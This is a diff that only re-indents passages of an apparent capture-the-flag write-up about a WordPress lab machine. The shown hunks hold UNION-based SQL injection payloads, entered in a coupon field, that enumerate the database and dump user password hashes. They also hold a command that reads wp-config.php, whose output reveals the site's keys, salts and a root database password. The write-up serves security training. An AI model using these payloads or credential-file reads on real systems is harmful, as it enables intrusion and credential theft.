@@ -141,68 +141,68 @@ Anyway Lets move on!
 
 To request all database names we ask for database ‘information_schema’ table ‘schemata’ column ‘schema_name’:
 ```
-    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(schema_name) FROM information_schema.schemata -- -
+' OR 1=1 UNION ALL SELECT NULL,NULL,concat(schema_name) FROM information_schema.schemata -- -
 
-  Response:
-    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : information_schema Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : coupons Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : mysql Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : performance_schema Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : sys Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : WordPress Is Valid!
+Response:
+   Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : information_schema Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : coupons Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : mysql Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : performance_schema Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : sys Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : WordPress Is Valid!
 ```
 Of course the database WordPress stands out.
 
 To ask for WordPress’s tables, again from database ‘information_schema’ we ask for table ‘TABLES’:
 ```
-    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='wordpress'-- -
+' OR 1=1 UNION ALL SELECT NULL,NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='wordpress'-- -
 
-  Response:
-    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_commentmeta Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_comments Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_links Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_options Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_postmeta Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_posts Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_term_relationships Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_term_taxonomy Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_termmeta Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_terms Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_usermeta Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_users Is Valid!
+Response:
+   Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_commentmeta Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_comments Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_links Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_options Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_postmeta Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_posts Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_term_relationships Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_term_taxonomy Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_termmeta Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_terms Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_usermeta Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_users Is Valid!
 ```
 The table that stands out now is the wp_users.
 
 To ask for wp_users’s columns, once again from database ‘information_schema’ we ask for table ‘COLUMNS’:
 ```
-    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(column_name) FROM information_schema.COLUMNS  WHERE TABLE_NAME='wp_users'-- -
+' OR 1=1 UNION ALL SELECT NULL,NULL,concat(column_name) FROM information_schema.COLUMNS  WHERE TABLE_NAME='wp_users'-- -
 
-  Response:
-    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : ID Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_login Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_pass Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_nicename Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_email Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_url Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_registered Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_activation_key Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : user_status Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : display_name Is Valid!
+Response:
+   Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : ID Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_login Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_pass Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_nicename Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_email Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_url Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_registered Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_activation_key Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : user_status Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : display_name Is Valid!
 ```
 
 So now we know what we ask for! Lets Dump the useful stuff!
 ```
-    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_pass,0x29) FROM wordpress.wp_users -- -
+' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_pass,0x29) FROM wordpress.wp_users -- -
 
-  Response:
-    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ Is Valid!
+Response:
+   Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ Is Valid!
 ```
 Nice ❤
 
@@ -228,11 +228,11 @@ wp_jeffrey:*******
 
 I enumerated the rest of the columns and found nothing more valuable that these hashes. 
 ```
-    ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_activation_key,0x29) FROM wordpress.wp_users -- -
+' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_activation_key,0x29) FROM wordpress.wp_users -- -
 
-  Response:
-    Coupon Code : With ID : And With Expire Date Of : (admin:1653007217:$P$BXuW77/My0s1ULQmkWaLEnoGljjLW5/) Is Valid!
-    Coupon Code : With ID : And With Expire Date Of : (wp_jeffrey:1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0) Is Valid!
+Response:
+   Coupon Code : With ID : And With Expire Date Of : (admin:1653007217:$P$BXuW77/My0s1ULQmkWaLEnoGljjLW5/) Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : (wp_jeffrey:1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0) Is Valid!
 ```
 
 Login with user wp_yura:
@@ -277,22 +277,22 @@ Start manually enumerating the “low hanging fruits”
 
 READING THE WP-CONFIG
 ```
-    cat /var/www/html/site.wekor.thm/wordpress/wp-config.php
+cat /var/www/html/site.wekor.thm/wordpress/wp-config.php
 
-    define( 'AUTH_KEY',         'V_hD%g&hh2BANp3+5fMB?>4lG}<OH*cd(6UnE/WqmdZTLo#8h4tN}[Ckdq`]{@kI' );
-    define( 'SECURE_AUTH_KEY',  '2^T<ziG&eEjuEzh^-Dk7n57IURC+JY2:(^o(;t<MmSWB-}vc2d6E@%BD9XQ*4}r?' );
-    define( 'LOGGED_IN_KEY',    '?X`:4j2fx]pZ%a0IGMLzg/nrI/dkz{D%n/nK$2h<%[6VV~TR8XD7-{Xz)hR6V45t' );
-    define( 'NONCE_KEY',        'Ilx%BU@7^aUY_~S~/?I$09?&bhH.!0U$7dNEr>dAj!;%[$MV<pie0^j,$C1U*tmY' );
-    define( 'AUTH_SALT',        '&6xsxo(_`wq`-BuAEC[&eN*Z(ecu[.$8dA$HQFV8*SC} ;|DW&?@B@~RhJD7[q(4' );
-    define( 'SECURE_AUTH_SALT', '/<I;TDbv_G5w,k9MuJ3ESAA=1N$25p*H;)!r-|7T{+rS@%QIF1>l Me::g2Cf2]+' );
-    define( 'LOGGED_IN_SALT',   'btBt`YR/?0(x)C0/aioT9]7.G{y~eo7C8?P6>@[wfFyygHQ!zkc_kqa`6RY]dE>z' );
-    define( 'NONCE_SALT',       'gK~TMo/<3*8X0N7G}D{2$&A$5E1^Hv$}`U<=lLa`{<50n1BgRUuE:7;a5h29mH[V' );
+define( 'AUTH_KEY',         'V_hD%g&hh2BANp3+5fMB?>4lG}<OH*cd(6UnE/WqmdZTLo#8h4tN}[Ckdq`]{@kI' );
+define( 'SECURE_AUTH_KEY',  '2^T<ziG&eEjuEzh^-Dk7n57IURC+JY2:(^o(;t<MmSWB-}vc2d6E@%BD9XQ*4}r?' );
+define( 'LOGGED_IN_KEY',    '?X`:4j2fx]pZ%a0IGMLzg/nrI/dkz{D%n/nK$2h<%[6VV~TR8XD7-{Xz)hR6V45t' );
+define( 'NONCE_KEY',        'Ilx%BU@7^aUY_~S~/?I$09?&bhH.!0U$7dNEr>dAj!;%[$MV<pie0^j,$C1U*tmY' );
+define( 'AUTH_SALT',        '&6xsxo(_`wq`-BuAEC[&eN*Z(ecu[.$8dA$HQFV8*SC} ;|DW&?@B@~RhJD7[q(4' );
+define( 'SECURE_AUTH_SALT', '/<I;TDbv_G5w,k9MuJ3ESAA=1N$25p*H;)!r-|7T{+rS@%QIF1>l Me::g2Cf2]+' );
+define( 'LOGGED_IN_SALT',   'btBt`YR/?0(x)C0/aioT9]7.G{y~eo7C8?P6>@[wfFyygHQ!zkc_kqa`6RY]dE>z' );
+define( 'NONCE_SALT',       'gK~TMo/<3*8X0N7G}D{2$&A$5E1^Hv$}`U<=lLa`{<50n1BgRUuE:7;a5h29mH[V' );
 
-    /** MySQL database username */
-    define( 'DB_USER', 'root' );
+/** MySQL database username */
+define( 'DB_USER', 'root' );
 
-    /** MySQL database password */
-    define( 'DB_PASSWORD', 'root123@#59' );
+/** MySQL database password */
+define( 'DB_PASSWORD', 'root123@#59' );
 
 ```
 This Password does not work with any user account.
